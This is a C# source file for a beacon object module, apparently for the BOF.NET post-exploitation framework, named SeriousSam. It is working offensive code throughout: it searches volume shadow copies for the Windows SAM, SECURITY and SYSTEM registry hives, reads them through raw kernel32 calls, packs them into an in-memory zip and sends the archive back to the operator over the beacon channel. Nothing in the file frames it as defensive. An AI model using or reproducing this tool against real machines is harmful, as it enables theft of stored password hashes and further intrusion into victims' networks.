using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using BOFNET;

namespace SeriousSam
{
    public class Execute : BeaconObject
    {

        public Execute(BeaconApi api) : base(api) { }
        public override void Go(string[] args)
        {

            int limit = 10;

            if (args.Length > 0)
            {
                limit = Int32.Parse(args[0]);
                BeaconConsole.WriteLine(String.Format("\n[!] Limit has changed to {0}", limit));
            }
            else
            {
                BeaconConsole.WriteLine(String.Format("\n[!] Will use default limit: {0}", limit));
            }

            try
            {
                for (int i = 1; i <= limit; i++)
                {

                    string currentFile = String.Format(@"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{0}\Windows\System32\config\SAM", i);
                    BeaconConsole.WriteLine(String.Format("\n[+] Looking for: {0} ...", currentFile));

                    var attr = NativeMethods.GetFileAttributesW(currentFile);

                    if (attr != NativeMethods.INVALID_FILE_ATTRIBUTES)
                    {
                        BeaconConsole.WriteLine(String.Format("\n[+] File {0} exists !!!", currentFile));

                        string[] keys = { "SAM", "SECURITY", "SYSTEM" };
                        string currentTime = DateTime.Now.ToString("yyyyMMddhhmm");

                        MemoryStream ms = new MemoryStream();

                        using (ZipArchive archive = new ZipArchive(ms, ZipArchiveMode.Create, true))
                        {
                            foreach (string key in keys)
                            {
                                string fileToDownload = String.Format(@"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{0}\Windows\System32\config\{1}", i, key);
                                var fHandle = NativeMethods.CreateFile(fileToDownload, NativeMethods.GENERIC_READ, 0, IntPtr.Zero, NativeMethods.OPEN_EXISTING, NativeMethods.FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                                string outputFile = String.Format("{0}_{1}", currentTime, key);

                                var demoFile = archive.CreateEntry(outputFile, CompressionLevel.Optimal);
                                using (var entryStream = demoFile.Open())
                                using (var streamWriter = new BinaryWriter(entryStream))
                                {

                                    if (!fHandle.IsInvalid)
                                    {
                                        using (var fs = new FileStream(fHandle, FileAccess.Read))
                                        {
                                            fs.Position = 0;
                                            var data = new byte[fs.Length];
                                            fs.Read(data, 0, data.Length);

                                            streamWriter.Write(data, 0, (int)data.Length);
                                        }
                                    }
                                    else
                                    {
                                        BeaconConsole.WriteLine(String.Format("\n[x] Error invalid handle : {0}", fileToDownload));
                                    }
                                }
                            }
                        }

                        ms.Seek(0, SeekOrigin.Begin);
                        string zipName = String.Format("{0}_SeriousSam.zip", currentTime);
                        DownloadFile(zipName, ms);
                        ms.Close();
                        BeaconConsole.WriteLine(String.Format("\n[+] File {0} downloaded!", zipName));

                        return;
                    }
                }

                BeaconConsole.WriteLine("\n[x] Did not found any shadow copy :'(");

            }
            catch (Exception ex)
            {
                BeaconConsole.WriteLine(String.Format("\n[x] BOF.NET Exception: {0}.", ex));
            }
        }


        public static void Main(string[] args)
        {

        }
    }
}

internal static class NativeMethods
{
    internal const uint GENERIC_READ = 0x80000000;
    internal const int FILE_ATTRIBUTE_NORMAL = 0x80;
    internal const int INVALID_FILE_ATTRIBUTES = -1;
    internal const int OPEN_EXISTING = 3;


    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    internal static extern SafeFileHandle CreateFile(string lpFileName, uint dwDesiredAccess,
  uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
  uint dwFlagsAndAttributes, IntPtr hTemplateFile);


    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    internal static extern int GetFileAttributesW(string lpFileName);
}